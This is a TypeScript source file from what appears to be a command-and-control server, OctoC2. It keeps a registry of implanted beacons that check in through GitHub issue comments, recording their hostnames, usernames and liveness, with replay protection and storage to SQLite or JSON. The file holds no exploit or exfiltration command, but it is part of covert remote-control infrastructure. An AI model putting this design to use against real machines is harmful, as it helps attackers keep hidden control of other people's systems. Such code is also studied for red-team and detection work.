/**
 * OctoC2 Server — BeaconRegistry
 *
 * In-memory compatibility view of all known beacons. When constructed with an
 * OctoStore, every mutation is durably reflected in SQLite. The JSON snapshot
 * path remains only for unmigrated callers; OctoStore performs its one-time,
 * backed-up import before this registry loads.
 *
 * Thread safety: single-threaded Bun runtime — no locks needed.
 */

import { join } from "node:path";
import { mkdir, readFile, writeFile, rename } from "node:fs/promises";
import { existsSync } from "node:fs";
import { CHANNEL_BY_ID, type ChannelId } from "@octoc2/shared";
import type { OctoStore, StoredBeacon } from "./store/index.ts";

export type BeaconStatus = "active" | "dormant" | "lost";

export interface BeaconRecord {
  beaconId:    string;
  /** GitHub issue number that serves as this beacon's C2 channel */
  issueNumber: number;
  /** Base64url X25519 public key — used to encrypt task deliveries */
  publicKey:   string;
  hostname:    string;
  username:    string;
  os:          string;
  arch:        string;
  firstSeen:   string;  // ISO-8601
  lastSeen:    string;  // ISO-8601
  status:      BeaconStatus;
  /**
   * Last observed seq value from beacon heartbeat.
   * Incremented monotonically by the beacon — server rejects replays.
   */
  lastSeq:     number;
  /** Canonical channel ID that processed the most recent check-in. */
  activeTentacle?: ChannelId;
}

interface RegistrySnapshot {
  version: 1;
  savedAt: string;
  beacons: BeaconRecord[];
}

export class BeaconRegistry {
  private readonly records = new Map<string, BeaconRecord>();
  private readonly dataDir: string;
  private readonly persistPath: string;
  private readonly store: OctoStore | null;
  private saveTimer: ReturnType<typeof setInterval> | null = null;
  private debounceTimer: ReturnType<typeof setTimeout> | null = null;
  private static readonly DEBOUNCE_MS = 1000;

  constructor(dataDir?: string, store?: OctoStore);
  constructor(store: OctoStore);
  constructor(
    dataDirOrStore: string | OctoStore =
      process.env["OCTOC2_DATA_DIR"] ?? "./data",
    explicitStore?: OctoStore,
  ) {
    if (typeof dataDirOrStore === "string") {
      this.dataDir = dataDirOrStore;
      this.store = explicitStore ?? null;
    } else {
      this.dataDir = dataDirOrStore.dataDir;
      this.store = dataDirOrStore;
    }
    this.persistPath = join(this.dataDir, "registry.json");
  }

  /** Load persisted state from disk. Call once at server startup. */
  async load(): Promise<void> {
    if (this.store) {
      this.records.clear();
      for (const stored of this.store.listBeacons()) {
        const record = this.fromStoredBeacon(stored);
        record.status = "dormant";
        this.persistRecord(record);
        this.records.set(record.beaconId, record);
      }
      console.log(
        `[Registry] Loaded ${this.records.size} beacon(s) from ${this.store.databasePath}`,
      );
      return;
    }

    if (!existsSync(this.persistPath)) return;

    try {
      const raw  = await readFile(this.persistPath, "utf8");
      const snap = JSON.parse(raw) as RegistrySnapshot;

      if (snap.version !== 1) {
        console.warn("[Registry] Unknown snapshot version, starting fresh.");
        return;
      }

      for (const record of snap.beacons) {
        // Mark everything as dormant on load — beacons prove liveness by checking in
        this.records.set(record.beaconId, { ...record, status: "dormant" });
      }

      console.log(`[Registry] Loaded ${this.records.size} beacon(s) from ${this.persistPath}`);
    } catch (err) {
      console.warn("[Registry] Failed to load registry:", (err as Error).message);
    }
  }

  /**
   * Start periodic auto-save (every intervalMs, default 5 min).
   * Call after load().
   */
  startAutoSave(intervalMs = 5 * 60 * 1000): void {
    if (this.saveTimer) clearInterval(this.saveTimer);
    if (this.store) {
      this.saveTimer = null;
      return;
    }
    this.saveTimer = setInterval(() => {
      this.persist().catch((err) =>
        console.warn("[Registry] Auto-save failed:", (err as Error).message)
      );
    }, intervalMs);
  }

  /** Persist registry to disk and stop auto-save. Call on graceful shutdown. */
  async shutdown(): Promise<void> {
    if (this.saveTimer) {
      clearInterval(this.saveTimer);
      this.saveTimer = null;
    }
    if (this.debounceTimer) {
      clearTimeout(this.debounceTimer);
      this.debounceTimer = null;
    }
    if (!this.store) await this.persist();
  }

  /**
   * Register a new beacon or update an existing one.
   * Called when the server processes a [job:...:reg:...] comment.
   */
  register(data: {
    beaconId:    string;
    issueNumber: number;
    publicKey:   string;
    hostname:    string;
    username:    string;
    os:          string;
    arch:        string;
    seq:         number;
    tentacleId?: ChannelId;
  }): BeaconRecord {
    const existing = this.records.get(data.beaconId);
    const now      = new Date().toISOString();

    let record: BeaconRecord = {
      beaconId:    data.beaconId,
      issueNumber: data.issueNumber,
      publicKey:   data.publicKey,
      hostname:    data.hostname,
      username:    data.username,
      os:          data.os,
      arch:        data.arch,
      firstSeen:      existing?.firstSeen ?? now,
      lastSeen:       now,
      status:   "active",
      lastSeq:  data.seq,
      // exactOptionalPropertyTypes: spread conditionally so the property is
      // absent (not explicitly `undefined`) when no tentacle ID is known.
      ...(data.tentacleId !== undefined
        ? { activeTentacle: data.tentacleId }
        : existing?.activeTentacle !== undefined
          ? { activeTentacle: existing.activeTentacle }
          : {}),
    };

    if (this.store) {
      const persisted = this.store.getBeacon(record.beaconId);
      const stored = this.store.upsertBeacon({
        beaconId: record.beaconId,
        issueNumber: record.issueNumber > 0 ? record.issueNumber : null,
        x25519PublicKey: record.publicKey,
        hostname: record.hostname,
        username: record.username,
        os: record.os,
        arch: record.arch,
        firstSeen: record.firstSeen,
        lastSeen: record.lastSeen,
        status: record.status,
        lastSeq: Math.max(
          persisted?.lastSeq ?? 0,
          existing?.lastSeq ?? 0,
          record.lastSeq,
        ),
        activeTentacle: record.activeTentacle ?? null,
      });
      record = this.fromStoredBeacon(stored);
    }
    this.records.set(data.beaconId, record);

    const verb = existing ? "Re-registered" : "Registered";
    console.log(
      `[Registry] ${verb} beacon ${data.beaconId} (${data.hostname}/${data.os}) ` +
      `on issue #${data.issueNumber}`
    );

    // Debounce persist so rapid registrations (e.g. 10 beacons checking in
    // within the same second) coalesce into a single disk write.
    if (!this.store) this.debouncedPersist();

    return record;
  }

  /** Refresh one in-memory record after an atomic store-side transition. */
  refreshFromStore(beaconId: string): BeaconRecord | undefined {
    if (!this.store) return this.records.get(beaconId);
    const stored = this.store.getBeacon(beaconId);
    if (!stored) return undefined;
    const record = this.fromStoredBeacon(stored);
    this.records.set(beaconId, record);
    return record;
  }

  get(beaconId: string): BeaconRecord | undefined {
    return this.records.get(beaconId);
  }

  getAll(): BeaconRecord[] {
    return [...this.records.values()];
  }

  /** Find a beacon by its issue number. Used when processing comment webhooks. */
  getByIssue(issueNumber: number): BeaconRecord | undefined {
    for (const record of this.records.values()) {
      if (record.issueNumber === issueNumber) return record;
    }
    return undefined;
  }

  /** Update the active tentacle channel for a known beacon. Returns false if beacon unknown or tentacleId invalid. */
  updateActiveTentacle(beaconId: string, tentacleId: ChannelId): boolean {
    if (
      !Object.prototype.hasOwnProperty.call(CHANNEL_BY_ID, String(tentacleId))
    ) {
      return false;
    }
    const record = this.records.get(beaconId);
    if (!record) return false;
    const updated = { ...record, activeTentacle: tentacleId };
    this.persistRecord(updated);
    Object.assign(record, updated);
    return true;
  }

  /** Update lastSeen and status to active. Returns false if beacon unknown. */
  updateLastSeen(beaconId: string, seq: number): boolean {
    const record = this.records.get(beaconId);
    if (!record) return false;

    const updated: BeaconRecord = {
      ...record,
      lastSeen: new Date().toISOString(),
      status: "active",
      lastSeq: this.store ? Math.max(record.lastSeq, seq) : seq,
    };
    this.persistRecord(updated);
    Object.assign(record, updated);
    return true;
  }

  /**
   * Validate and advance the seq counter (replay protection).
   * Returns:
   *   "ok"      — seq is valid, registry updated
   *   "replay"  — seq ≤ lastSeq, discard
   *   "unknown" — beacon not in registry
   *   "gap"     — seq jumped by >100 (warn but accept)
   */
  advanceSeq(
    beaconId: string,
    seq: number
  ): "ok" | "replay" | "unknown" | "gap" {
    const record = this.records.get(beaconId);
    if (!record) return "unknown";

    if (seq <= record.lastSeq) return "replay";

    if (this.store) {
      const result = this.store.advanceBeaconSequence(beaconId, seq);
      if (result.status === "unknown") return "unknown";
      if (result.status === "replay") {
        const stored = this.store.getBeacon(beaconId);
        if (stored) Object.assign(record, this.fromStoredBeacon(stored));
        return "replay";
      }
      const stored = this.store.getBeacon(beaconId);
      if (!stored) return "unknown";
      Object.assign(record, this.fromStoredBeacon(stored));
      return result.status === "gap" ? "gap" : "ok";
    }

    const result = seq > record.lastSeq + 100 ? "gap" : "ok";
    record.lastSeq = seq;
    return result;
  }

  markDormant(beaconId: string): void {
    const record = this.records.get(beaconId);
    if (!record) return;
    const updated: BeaconRecord = { ...record, status: "dormant" };
    this.persistRecord(updated);
    Object.assign(record, updated);
  }

  markLost(beaconId: string): void {
    const record = this.records.get(beaconId);
    if (!record) return;
    const updated: BeaconRecord = { ...record, status: "lost" };
    this.persistRecord(updated);
    Object.assign(record, updated);
  }

  /**
   * Scan all beacons and mark any that haven't checked in within
   * `thresholdMs` as dormant. Call on each poll cycle.
   */
  sweepDormant(thresholdMs = 10 * 60 * 1000): void {
    this.sweepStatuses(thresholdMs, Number.MAX_SAFE_INTEGER);
  }

  /**
   * Apply both liveness transitions from the same last-seen timestamp.
   *
   * A very old active record transitions directly to lost. A later signed
   * check-in reactivates either state through register/updateLastSeen.
   */
  sweepStatuses(
    dormantAfterMs = 10 * 60 * 1000,
    lostAfterMs = 24 * 60 * 60 * 1000,
    nowMs = Date.now(),
  ): void {
    if (
      !Number.isSafeInteger(dormantAfterMs) ||
      dormantAfterMs <= 0 ||
      !Number.isSafeInteger(lostAfterMs) ||
      lostAfterMs <= dormantAfterMs ||
      !Number.isSafeInteger(nowMs) ||
      nowMs < 0
    ) {
      throw new Error(
        "liveness thresholds must be positive safe integers with lostAfterMs > dormantAfterMs",
      );
    }

    for (const record of this.records.values()) {
      const lastSeenMs = new Date(record.lastSeen).getTime();
      if (!Number.isFinite(lastSeenMs)) continue;
      const ageMs = nowMs - lastSeenMs;
      let nextStatus: BeaconStatus | null = null;
      if (ageMs >= lostAfterMs && record.status !== "lost") {
        nextStatus = "lost";
      } else if (
        ageMs >= dormantAfterMs &&
        record.status === "active"
      ) {
        nextStatus = "dormant";
      }
      if (nextStatus) {
        const updated: BeaconRecord = { ...record, status: nextStatus };
        this.persistRecord(updated);
        Object.assign(record, updated);
        console.log(
          `[Registry] Beacon ${record.beaconId} (${record.hostname}) marked ${nextStatus}`,
        );
      }
    }
  }

  /** Queue a persist with 1-second debounce. Multiple calls within the window coalesce. */
  private debouncedPersist(): void {
    if (this.debounceTimer) {
      clearTimeout(this.debounceTimer);
    }
    this.debounceTimer = setTimeout(() => {
      this.debounceTimer = null;
      this.persist().catch((err) =>
        console.warn("[Registry] Debounced persist failed:", (err as Error).message)
      );
    }, BeaconRegistry.DEBOUNCE_MS);
  }

  private async persist(): Promise<void> {
    if (this.store) return;
    await mkdir(this.dataDir, { recursive: true });

    const snapshot: RegistrySnapshot = {
      version: 1,
      savedAt: new Date().toISOString(),
      beacons: [...this.records.values()],
    };

    const tmp = `${this.persistPath}.tmp`;
    await writeFile(tmp, JSON.stringify(snapshot, null, 2), "utf8");
    await rename(tmp, this.persistPath);
  }

  private persistRecord(record: BeaconRecord): void {
    if (!this.store) return;
    this.store.upsertBeacon({
      beaconId: record.beaconId,
      issueNumber: record.issueNumber > 0 ? record.issueNumber : null,
      x25519PublicKey: record.publicKey,
      hostname: record.hostname,
      username: record.username,
      os: record.os,
      arch: record.arch,
      firstSeen: record.firstSeen,
      lastSeen: record.lastSeen,
      status: record.status,
      lastSeq: record.lastSeq,
      activeTentacle: record.activeTentacle ?? null,
    });
  }

  private fromStoredBeacon(stored: StoredBeacon): BeaconRecord {
    return {
      beaconId: stored.beaconId,
      issueNumber: stored.issueNumber ?? 0,
      publicKey: stored.x25519PublicKey,
      hostname: stored.hostname,
      username: stored.username,
      os: stored.os,
      arch: stored.arch,
      firstSeen: stored.firstSeen,
      lastSeen: stored.lastSeen,
      status: stored.status,
      lastSeq: stored.lastSeq,
      ...(stored.activeTentacle !== null
        ? { activeTentacle: stored.activeTentacle }
        : {}),
    };
  }
}
